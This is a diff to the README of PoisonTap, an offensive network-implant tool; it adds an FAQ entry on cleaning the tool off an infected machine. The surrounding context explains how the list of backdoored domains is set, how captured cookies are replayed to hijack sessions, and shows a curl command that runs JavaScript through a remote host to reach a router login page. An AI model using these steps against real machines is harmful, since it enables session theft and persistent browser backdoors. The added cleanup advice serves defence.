@@ -210,6 +210,8 @@ curl 'http://samy.pl:1337/exec?$.get("http://192.168.0.1.ip.samy.pl/login",funct
 * **A:** The list of domains to be backdoored is set in `target_injected_xhtmljs.html` by the `getDoms()` function. This itself is populated by the `alexa1m.sh` script in the root of the repo. If you wish to add additional domains to this list, you can simply amend the return call in `getDoms()`.
 * **Q:** How do you use the captured cookies?
 * **A:** You can use the [Document.cookie API](https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie) directly from the JavaScript console in your browser to set cookies. [This StackOverflow post](https://superuser.com/questions/244062/how-do-i-view-add-or-edit-cookies-in-google-chrome) also has a few Chrome-specific suggestions, for example the [Cookie Inspector](https://chrome.google.com/webstore/detail/cookie-inspector/jgbbilmfbammlbbhmmgaagdkbkepnijn) Chrome extension.
+* **Q:** How do I clean Poisontap from a machine?
+* **A:** You should clear the local OS DNS cache, as well as any browser caches. You may also need to invalidate any logged-in sessions at the time, which may have leaked cookies. Ensure that these invalidate existing cookies, rather than simply logging you out. (If you want to safetly work with a PoisonTap device on your current machine, make sure to exit any browser, then you should be able to safetly connect it to your machine).
 
 -----
 
